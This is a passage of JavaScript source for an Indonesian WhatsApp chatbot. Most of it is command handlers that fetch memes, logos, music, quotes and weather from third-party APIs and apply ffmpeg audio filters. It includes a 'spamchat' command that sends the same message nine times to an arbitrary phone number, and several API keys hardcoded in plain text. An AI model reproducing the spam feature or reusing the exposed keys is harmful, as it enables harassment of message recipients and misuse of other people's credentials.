	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'crossgun':
	if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await Angga.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/crossgun/?urlgbr=${anu.display_url}`)
	 Angga.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
		case 'hartatata3':
				 				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply(ind.wrongf())
				bh = body.slice(12)
				reply(ind.wait())
				bh = await getBuffer(`https://api.vhtear.com/hartatahta?text=${bh}&apikey=c1d162b46e634f389efa1ac715f03d03`)
				Angga.sendMessage(from, bh, image, {caption: 'Nih kak udah jadi..', quoted: mek})
				await limitAdd(sender)
				break
		case 'text2gif':
				 				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply(ind.wrongf())
				bh = body.slice(10)
				reply(ind.wait())
				bh = await getBuffer(`https://api.vhtear.com/textxgif?text=${bh}&apikey=c1d162b46e634f389efa1ac715f03d03`)
				Angga.sendMessage(from, bh, image, {caption: 'Nih kak udah jadi..', quoted: mek})
				await limitAdd(sender)
				break
		case 'ttp':
                case 'ttp2':
                case 'ttp3':
                case 'ttp4':
                case 'attp':
                    if (args.length == 0) return reply(`Salah\nCONTOH\n${prefix + command} Riu Cuy`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${LoLKey}&text=${ini_txt}`)
                    await Angga.sendMessage(from, ini_buffer, sticker, { quoted: mek })
                    break
                    case 'spamchat':
                    if (!isOwner) return reply(ind.ownerb())
                if (isBanned) return reply(ind.baned())
                if (!isRegistered) return reply(ind.noregis())
                if (args.length < 2) return reply(`Mau Spamchat ke siapa? Contoh: ${prefix}spamchat 6285283427860 Oy ajc`)
          				if (args[0].startsWith('08')) return reply('Gunakan kode bahasa kak')
          
                        mansed = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
          				const kontul = body.slice(8)
                      if (kontul.length > 300) return Angga.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, {quoted: mek})
                        var nomor = mek.participant
                       const busah = `*[  SPAM CHAT  ]*\nNomor : @${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${kontul}`

                      var options = {
                         text: busah,
                         contextInfo: {mentionedJid: [nomor]},
                     }
                    Angga.sendMessage(`${mansed}`, options, text, {quoted: mek})
                       .then(() => { Angga.sendMessage(`${mansed}`, options, text, {quoted: mek})})
                       .then(() => { Angga.sendMessage(`${mansed}`, options, text, {quoted: mek})})
                       .then(() => { Angga.sendMessage(`${mansed}`, options, text, {quoted: mek})})
                    .then(() => { Angga.sendMessage(`${mansed}`, options, text, {quoted: mek})})
                    .then(() => { Angga.sendMessage(`${mansed}`, options, text, {quoted: mek})})
                    .then(() => { Angga.sendMessage(`${mansed}`, options, text, {quoted: mek})})
                    .then(() => { Angga.sendMessage(`${mansed}`, options, text, {quoted: mek})})
                    .then(() => { Angga.sendMessage(`${mansed}`, options, text, {quoted: mek})})
                    reply('SPAMCHAT ANDA TELAH SAMPAI KE NOMOR YG DITUJU')
                    break
					
		case 'thunder':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply(ind.wrongf())
				bhaine = body.slice(9)
				reply(ind.wait())
				anu = await fetchJson(`https://api.zeks.xyz/api/thundertext?text=${bhaine}&apikey=apivinz`)
				buffer = await getBuffer(anu.result)
				Angga.sendMessage(from, buffer, image, {caption: 'Nih kak udah jadi..', quoted: mek})
				await limitAdd(sender)
				break
		case 'imgmaker':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Url png/jpg mana kak')
				ainez = body.slice(10)
				reply(ind.wait())
				anu = await fetchJson(`http://lolhuman.herokuapp.com/api/quotemaker?apikey=${LoLKey}&text=${ainez}`, {method: 'get'})
				buffer = await getBuffer(anu.result)
				Angga.sendMessage(from, buffer, image, {caption: 'Nih kak udah jadi..', quoted: mek})
				await limitAdd(sender)
				break
		case 'calendermaker':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Url png/jpg mana kak')
				ainez2 = body.slice(15)
				reply(ind.wait())
				anu = await fetchJson(`https://api.zeks.xyz/api/calendar?img=${ainez2}&apikey=apivinz`, {method: 'get'})
				buffer = await getBuffer(anu.result)
				Angga.sendMessage(from, buffer, image, {caption: 'Nih kak udah jadi..', quoted: mek})
				await limitAdd(sender)
				break
		case 'nekonime':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
                                        gatauda = body.slice(8)
					reply(ind.wait())
                                        anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nekonime?apikey=${TobzKey}`, {method: 'get'})
                                        buffer = await getBuffer(anu.result)
                                        Angga.sendMessage(from, buffer, image, {quoted: mek})
					await limitAdd(sender)
                                        break
		case 'husbu':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				gatauda = body.slice(13)
				reply(ind.wait())
				anu = await fetchJson(`https://tobz-api.herokuapp.com/api/husbu2?apikey=${TobzKey}`, {method: 'get'})
				buffer = await getBuffer(anu.result)
				Angga.sendMessage(from, buffer, image, {quoted: mek})
				await limitAdd(sender)
				break
		case 'shota':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				    try {
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/randomshota?apikey=${TobzKey}`)
						buffer = await getBuffer(res.image)
						Angga.sendMessage(from, buffer, image, {quoted: mek, caption: 'Ingat! Cintai husbumu'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ *ERROR* ❌')
					}
					await limitAdd(sender)
					break
                case 'jokerlogo':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Teks nya mana kak?')
				tels = body.slice(10)
				reply(ind.wait())
				anu = await fetchJson(`https://tobz-api.herokuapp.com/api/textpro?theme=jokerlogo&text=${tels}&apikey=${TobzKey}`, {method: 'get'})
				buffer = await getBuffer(anu.result)
				Angga.sendMessage(from, buffer, image, {quoted: mek})
				await limitAdd(sender)
				break
                case 'anime':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				gatauda = body.slice(5)
				reply(ind.wait())
				anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomanime?apikey=${TobzKey}`, {method: 'get'})
				buffer = await getBuffer(anu.result)
				Angga.sendMessage(from, buffer, image, {quoted: mek})
				await limitAdd(sender)
				break
				case 'slowmo':
				
				encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				media = await Angga.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
				fs.unlinkSync(media)
				if (err) return reply('Error!')
				uhh = fs.readFileSync(ran)
				Angga.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek,duration:999999999999})
				fs.unlinkSync(ran)
				})
				break

				case 'tupai':
				
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Angga.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek,duration:999999999999})
						fs.unlinkSync(ran)
					})
				break
				case `${prefix}bikingc`:
                case `${prefix}creategroup`:
                const saya = '6285283427860@c.us'
                arg = body.trim().split('|')
                Angga.sendMessage(from, `otw MythicXbot`, MessageType.text, {quoted : freply})
                const gcname = args[1]
                Angga.groupCreate(gcname, saya)
                Angga.sendMessage(from, 'Group Created')
                break
				case 'gemok':
				
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Angga.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek,duration:999999999999})
						fs.unlinkSync(ran)
					})
				break
				case 'joingc':
					if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (!isGroup) return reply(ind.groupo())
					if (!isOwner) return reply(ind.ownerb())
codeInvite = body.slice(32)
response = await Angga.acceptInvite(codeInvite)
reply('Done!!!')
console.log(response)
break
				case 'bass':                 
				
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Angga.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Angga.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek,duration:999999999999})
						fs.unlinkSync(ran)
					})
				break
				
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				gatauda = body.slice(4)
				reply(ind.wait())
				anu = await fetchJson(`https://alfians-api.herokuapp.com/api/nekonime`, {method: 'get'})
				buffer = await getBuffer(anu.result)
				Angga.sendMessage(from, buffer, image, {quoted: mek})
				await limitAdd(sender)
				break
				case 'tolol': 
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Teks nya mana ? titit ?')
				gatauda = body.slice(6)
				reply(ind.wait())
				buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/toloserti?apikey=${LoLKey}&name=${gatauda}`, {method: 'get'})
				Angga.sendMessage(from, buffer, image, {quoted: mek})
				await limitAdd(sender)
				break
				case 'emoji2img': 
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('emoji nya mana sayang ?')
				gatauda = body.slice(11)
				reply(ind.wait())
				buffer = await getBuffer(`https://api.zeks.xyz/api/emoji-image?apikey=apivinz&emoji=${gatauda}`, {method: 'get'})
				Angga.sendMessage(from, buffer, image, {quoted: mek})
				await limitAdd(sender)
				break
                case 'memeindo':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				gatauda = body.slice(8)
				reply(ind.wait())
				anu = await fetchJson(`https://api.zeks.xyz/api/memeindo?apikey=apivinz`, {method: 'get'})
				buffer = await getBuffer(anu.result)
				Angga.sendMessage(from, buffer, image, {quoted: mek})
				await limitAdd(sender)
				break
				case 'asupan':
			if (!isRegistered) return reply(ind.noregis())
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/asupan?apikey=${LoLKey}`)
                    buffer = await getBuffer(get_result.result)
                    Angga.sendMessage(from, buffer, video, { quoted: mek, mimetype: Mimetype.mp4, filename: "asupan.mp4" })
                    break
					case 'meme': 
				if (!isRegistered) return reply(ind.noregis())
				buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/random/meme?apikey=${LoLKey}`, {method: 'get'})
				Angga.sendMessage(from, buffer, image, {quoted: mek})
				break
				case 'darkjoke': 
				 // Fix Bug By RzkyO				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				gatauda = body.slice(8)
				reply(ind.wait())
				buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/meme/darkjoke?apikey=${LoLKey}`, {method: 'get'})
				Angga.sendMessage(from, buffer, image, {quoted: mek})
				await limitAdd(sender)
				break
				case 'darkjokes': 
				 // Fix Bug By RzkyO				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				gatauda = body.slice(8)
				reply(ind.wait())
				buffer = await getBuffer(`https://api.xteam.xyz/randomimage/darkjoke?APIKEY=f5823afb6bf99782`, {method: 'get'})
				Angga.sendMessage(from, buffer, image, {quoted: mek})
				await limitAdd(sender)
				break
			
		case 'randomkpop':
				gatauda = body.slice(10)
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				reply(ind.wait())
				anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomkpop?apikey=${TobzKey}`, {method: 'get'})
				buffer = await getBuffer(anu.result)
				Angga.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih kpopnya kak...'})
				await limitAdd(sender)
				break
		case 'aesthetic':
				gatauda = body.slice(9)
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				reply(ind.wait())
				anu = await fetchJson(`https://api.zeks.xyz/api/estetikpic?apikey=apivinz`, {method: 'get'})
				buffer = await getBuffer(anu.result.result)
				Angga.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih aestheticnya kak...'})
				await limitAdd(sender)
				break
		case 'darklogo': 
		//NEW BY AnggaGanzz XZ
				gatauda = body.slice(9)
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Teksnya mana um')
				reply(ind.wait())
				buffer = await getBuffer(`https://api.xteam.xyz/textpro/metaldarkgold?text=${gatauda}&APIKEY=f5823afb6bf99782`, {method: 'get'})
				Angga.sendMessage(from, buffer, image, {quoted: mek, caption: 'SUBSCRIBE MY : FxAG Xc'})
				await limitAdd(sender)
				break
				case 'ballon':
				//BY AnggaGanzz XZ
				gatauda = body.slice(8)
				if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Teksnya mana um')
				reply(ind.wait())
				buffer = await getBuffer(`https://api.xteam.xyz/textpro/purplefoilballon?text=${gatauda}&APIKEY=f5823afb6bf99782`, {method: 'get'})
				Angga.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih kak\nSubscribe AnggaGanzz Xz kak...'})
				await limitAdd(sender)
				break
				
		case 'logoepep2': 
				gatauda = body.slice(10)
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Teksnya mana um')
				reply(ind.wait())
				buffer = await getBuffer(`https://api.vhtear.com/logoff?hero=Alok&text=${gatauda}&apikey=c1d162b46e634f389efa1ac715f03d03`, {method: 'get'})
				Angga.sendMessage(from, buffer, image, {quoted: mek, caption: 'SUBSCRIBE MY : FxAG Xc'})
				await limitAdd(sender)
				break
		case 'logoepep3': 
				gatauda = body.slice(10)
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Teksnya mana um')
				reply(ind.wait())
				buffer = await getBuffer(`https://api.vhtear.com/logoff?hero=Alvaro&text=${gatauda}&apikey=c1d162b46e634f389efa1ac715f03d03`, {method: 'get'})
				Angga.sendMessage(from, buffer, image, {quoted: mek, caption: 'SUBSCRIBE MY : FxAG Xc'})
				await limitAdd(sender)
				break
		case 'logoepep4': 
				gatauda = body.slice(10)
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Teksnya mana um')
				reply(ind.wait())
				buffer = await getBuffer(`https://api.vhtear.com/logoff?hero=Caroline&text=${gatauda}&apikey=c1d162b46e634f389efa1ac715f03d03`, {method: 'get'})
				Angga.sendMessage(from, buffer, image, {quoted: mek, caption: 'SUBSCRIBE MY : FxAG Xc'})
				await limitAdd(sender)
				break
		case 'logoepep5': 
				gatauda = body.slice(10)
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Teksnya mana um')
				reply(ind.wait())
				buffer = await getBuffer(`https://api.vhtear.com/logoff?hero=Kla&text=${gatauda}&apikey=c1d162b46e634f389efa1ac715f03d03`, {method: 'get'})
				Angga.sendMessage(from, buffer, image, {quoted: mek, caption: 'SUBSCRIBE MY : FxAG Xc'})
				await limitAdd(sender)
				break
		case 'gamelogo': 
				gatauda = body.slice(9)
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Teksnya mana um')
				reply(ind.wait())
				buffer = await getBuffer(`https://api.vhtear.com/gamelogo?text=${gatauda}&apikey=c1d162b46e634f389efa1ac715f03d03`, {method: 'get'})
				Angga.sendMessage(from, buffer, image, {quoted: mek, caption: 'SUBSCRIBE MY : FxAG Xc'})
				await limitAdd(sender)
				break
		case 'pornlogo': 
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					var gh = body.slice(10)
					var gbl7 = gh.split("/")[0];
					var gbl8 = gh.split("/")[1];
				if (args.length < 1) return reply('Teksnya mana um')
				reply(ind.wait())
				buffer = await getBuffer(`https://api.vhtear.com/pornlogo?text1=${gbl7}&text2=${gbl8}&apikey=c1d162b46e634f389efa1ac715f03d03`, {method: 'get'})
				Angga.sendMessage(from, buffer, image, {quoted: mek, caption: 'SUBSCRIBE MY : FxAG Xc'})
				await limitAdd(sender)
				break
				case 'joox':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jooxplay?apikey=${LoLKey}&query=${query}`)
                    get_result = get_result.result
                    cuy = `
─────────────────────
◪ 「 *JOOX PLAY* 」
│
└ ❏ Judul: *${get_result.info.song}*
    ❏ Artis: *${get_result.info.singer}*
    ❏ Album: *${get_result.info.album}*
    ❏ Durasi: ${get_result.info.duration}
    ❏ Tipe: *${command}*
─────────────────────`
                    thumbnail = await getBuffer(get_result.image)
                    await Angga.sendMessage(from, thumbnail, image, { quoted: mek, caption: cuy, contextInfo: { forwardingScore: 1, isForwarded: true} })
                    get_audio = await getBuffer(get_result.audio[0].link)
                    await Angga.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', ptt:true, filename: `${get_result.info.song}.mp3`, quoted: mek, duration: 99999999999, contextInfo: { forwardingScore: 508, isForwarded: true}})
                    break
		case 'play':   
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				reply(ind.wait())
				play = body.slice(5)
				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?q=${play}&apikey=apivinz`)
				if (anu.error) return reply(anu.error)
				infomp3 = `*Lagu Ditemukan!!!*\nJudul : ${anu.result.title}\nSource : ${anu.result.source}\nUkuran : ${anu.result.size}\n\n*TUNGGU SEBENTAR LAGI DIKIRIM MOHON JANGAN SPAM YA SAYANG*`
				buffer = await getBuffer(anu.result.thumbnail)
				Angga.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
				lagu = await getBuffer(anu.result.url_audio)
				Angga.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek})
				await limitAdd(sender)
				break
		case 'limit':
				
                 if (!isRegistered) return reply( ind.noregis())
				checkLimit(sender)
				break
		case 'vinta':
				
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply(ind.wrongf())
				vin = body.slice(7)
				reply(ind.wait())
				vintage = await getBuffer(`https://m.arugaz.my.id/api/textpro/realvintage?text=${vin}`)
				Angga.sendMessage(from, vintage, image, {caption: 'Nih kak ${vin}', quoted: mek})
				await limitAdd(sender)
				break
                case '1cak':
				    try {
					    
                 if (!isRegistered) return reply( ind.noregis())
					    if (isLimit(sender)) return reply(ind.limitend(pusname))
					    if (isBanned) return reply('Maaf kamu sudah terbenned!')
					    if (!isGroup) return reply(ind.groupo())
					    if (!isNsfw) return reply(ind.nsfwoff())
						res = await fetchJson(`https://st4rz.herokuapp.com/api/1cak`, {method: 'get'})
						buffer = await getBuffer(res.result)
						Angga.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nih Kak udah Jadi'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply(ind.wrongf())
					}
					await limitAdd(sender)
					break
					case 'totaluser':
					Angga.updatePresence(from, Presence.composing) 
 
					if (!isRegistered) return reply(ind.noregis())
				if (isBanned) return reply(ind.baned())   
					teks = `\`\`\`╭────*「 *TOTAL USER Angga Bot👑* 」\n\`\`\``
					no = 0
					for (let hehehe of registered) {
						no += 1
						teks += `\`\`\`[${no.toString()}]\`\`\` @${hehehe.split('@')[0]}\n`
					}
					teks += `│+ Total Pengguna : ${_registered.length}\n╰──────*「 *Angga Bot* 」*────`
					Angga.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": registered}})
					break
                case 'animequotes':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/quotesnime/random`, {method: 'get'})
					reply(anu.data.quote)
					await limitAdd(sender)
					break	
                case 'twichquotes':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/twichquote`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
					break	
                case 'faktaunik': // Fixed By Yogiツ & FxSx
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/random/faktaunik?apikey=${LoLKey}`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
					break		
		case 'quotes':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					data = await fetchJson(`https://api.shizukaa.xyz/api/randomquote?apikey=itsmeiky633`)
					cop = `Quotes : _${data.quotes}_\n\nAuthor : _${data.author}_`
					reply(cop)
					await limitAdd(sender)
					break
		case 'covidindo': 
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					data = await fetchJson(`https://videfikri.com/api/covidindo/`)
					hasil = `Positif : ${data.result.positif}\nSembuh : ${data.result.sembuh}\nMeninggal : ${data.result.meninggal}\nDirawat : ${data.result.dalam_perawatan}`
					reply(hasil)
					await limitAdd(sender)
					break	
		case 'infonomor':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (args.length < 1) return reply(`Masukan Nomor\nContoh : ${prefix}infonomor 0812345678`)
					data = await fetchJson(`https://docs-jojo.herokuapp.com/api/infonomor?no=${body.slice(11)}`)
					if (data.error) return reply(data.error)
					if (data.result) return reply(data.result)
					hasil = `╠➥ internasional : ${data.international}\n╠➥ nomor : ${data.nomor}\n╠➥ operator : ${data.op}`
					reply(hasil)
					await limitAdd(sender)
					break 
		case 'infogempa':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/infogempa?apikey=${TobzKey}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					buffer= await getBuffer(anu.map)
					hasil = `*Potensi*\n${anu.potensi}\n*Lokasi*\n${anu.lokasi}\n*Magnitude*\n${anu.magnitude}\n*Koordinat*\n${anu.koordinat}\n*Kedalaman*\n${anu.kedalaman}\n*Waktu*\n${anu.waktu}\n*Map*\n${anu.map}`
					Angga.sendMessage(from, buffer, image, {quoted: mek, caption: hasil})
					await limitAdd(sender)
					break
		case 'infocuaca':
					tels = body.slice(11)
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/cuaca?wilayah=${tels}&apikey=${TobzKey}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					hasil = `*Tempat* : ${anu.result.tempat}\n*Cuaca* : ${anu.result.cuaca}\n*Angin* : ${anu.result.angin}\n*Suhu* : ${anu.result.suhu}\n*Kelembapan* : ${anu.result.kelembapan}`
					Angga.sendMessage(from, hasil, text, {quoted: mek})
					await limitAdd(sender)
					break
		case 'kurs': 
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.vhtear.com/kurs&apikey=c1d162b46e634f389efa1ac715f03d03`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					hasil = `\n*==========*\n*USD Jual* : ${anu.result.Data.USD.Jual}\n*USD Beli* : ${anu.result.Data.USD.Beli}\n*==========*\n*SGD Jual* : ${anu.result.Data.SGD.Jual}\n*SGD Beli* : ${anu.result.Data.SGD.Beli}\n*==========*\n*EUR Jual* : ${anu.result.Data.EUR.Jual}\n*EUR Beli* : ${anu.result.Data.EUR.Beli}\n*==========*\n*AUD Jual* : ${anu.result.Data.AUD.Jual}\n*AUD Beli* : ${anu.result.Data.AUD.Beli}\n*==========*\n*DKK Jual* : ${anu.result.Data.DKK.Jual}\n*DKK Beli* : ${anu.result.Data.DKK.Beli}\n*==========*\n*SEK Jual* : ${anu.result.Data.SEK.Jual}\n*SEK Beli* : ${anu.result.Data.SEK.Beli}\n*==========*\n*CAD Jual* : ${anu.result.Data.CAD.Jual}\n*CAD Beli* : ${anu.result.Data.CAD.Beli}\n*==========*\n*CHF Jual* : ${anu.result.Data.CHF.Jual}\n*CHF Beli* : ${anu.result.Data.CHF.Beli}\n*==========*\n*NZD Jual* : ${anu.result.Data.NZD.Jual}\n*NZD Beli* : ${anu.result.Data.NZD.Beli}\n*==========*\n*GBP Jual* : ${anu.result.Data.GBP.Jual}\n*GBP Beli* : ${anu.result.Data.GBP.Beli}\n*==========*\n*HKD Jual* : ${anu.result.Data.HKD.Jual}\n*HKD Beli* : ${anu.result.Data.HKD.Beli}\n*==========*\n*JPY Jual* : ${anu.result.Data.JPY.Jual}\n*JPY Beli* : ${anu.result.Data.JPY.Beli}\n*==========*\n*SAR Jual* : ${anu.result.Data.SAR.Jual}\n*SAR Beli* : ${anu.result.Data.SAR.Beli}\n*==========*\n*CNH Jual* : 